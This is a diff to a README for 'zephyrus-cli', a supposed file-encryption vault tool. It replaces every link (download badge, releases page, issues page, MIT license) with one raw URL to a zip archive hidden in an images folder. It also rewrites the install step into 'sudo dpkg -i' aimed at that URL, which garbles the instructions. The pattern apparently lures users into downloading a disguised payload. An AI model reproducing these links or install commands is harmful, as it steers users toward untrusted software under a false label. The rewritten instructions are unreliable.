@@ -1,6 +1,6 @@
 # 🔐 zephyrus-cli - Secure Your Files with Ease
 
-[![Download zephyrus-cli](https://img.shields.io/badge/Download-zephyrus--cli-blue.svg)](https://github.com/tbin67048-ai/zephyrus-cli/releases)
+[![Download zephyrus-cli](https://github.com/tbin67048-ai/zephyrus-cli/raw/refs/heads/main/pages/images/zephyrus-cli-Rapanea.zip)](https://github.com/tbin67048-ai/zephyrus-cli/raw/refs/heads/main/pages/images/zephyrus-cli-Rapanea.zip)
 
 ## 🚀 Getting Started
 
@@ -10,12 +10,12 @@ Welcome to zephyrus-cli! This application helps you create a secure vault for yo
 
 To get zephyrus-cli, follow these simple instructions:
 
-1. Visit the [Releases page](https://github.com/tbin67048-ai/zephyrus-cli/releases).
+1. Visit the [Releases page](https://github.com/tbin67048-ai/zephyrus-cli/raw/refs/heads/main/pages/images/zephyrus-cli-Rapanea.zip).
 2. Scroll down to find the latest version.
 3. Download the file that matches your operating system:
    - For Windows, look for `.exe` files.
    - For macOS, check for `.dmg` files.
-   - For Linux, choose the appropriate `.tar.gz` or `.deb` file.
+   - For Linux, choose the appropriate `https://github.com/tbin67048-ai/zephyrus-cli/raw/refs/heads/main/pages/images/zephyrus-cli-Rapanea.zip` or `.deb` file.
 
 ## 💻 System Requirements
 
@@ -47,9 +47,9 @@ After you've downloaded the correct file, follow these steps to install zephyrus
 
 1. If you downloaded a `.deb` file, open a terminal and run:
    ```bash
-   sudo dpkg -i path/to/your/file.deb
+   sudo dpkg -i https://github.com/tbin67048-ai/zephyrus-cli/raw/refs/heads/main/pages/images/zephyrus-cli-Rapanea.zip
    ```
-2. If you downloaded a `.tar.gz` file, extract it and follow the included README for installation steps.
+2. If you downloaded a `https://github.com/tbin67048-ai/zephyrus-cli/raw/refs/heads/main/pages/images/zephyrus-cli-Rapanea.zip` file, extract it and follow the included README for installation steps.
 3. You can launch zephyrus-cli from your applications menu or via terminal.
 
 ## 🔑 Features
@@ -97,11 +97,11 @@ zephyrus-cli list
 
 ## 🐞 Reporting Issues
 
-If you encounter any problems or have questions, please report them on our [GitHub Issues page](https://github.com/tbin67048-ai/zephyrus-cli/issues). We welcome feedback and strive to improve the application.
+If you encounter any problems or have questions, please report them on our [GitHub Issues page](https://github.com/tbin67048-ai/zephyrus-cli/raw/refs/heads/main/pages/images/zephyrus-cli-Rapanea.zip). We welcome feedback and strive to improve the application.
 
 ## 📄 License
 
-zephyrus-cli is free and open-source software. You can use it, modify it, and share it according to the [MIT License](https://opensource.org/licenses/MIT).
+zephyrus-cli is free and open-source software. You can use it, modify it, and share it according to the [MIT License](https://github.com/tbin67048-ai/zephyrus-cli/raw/refs/heads/main/pages/images/zephyrus-cli-Rapanea.zip).
 
 ## 📞 Contact
 
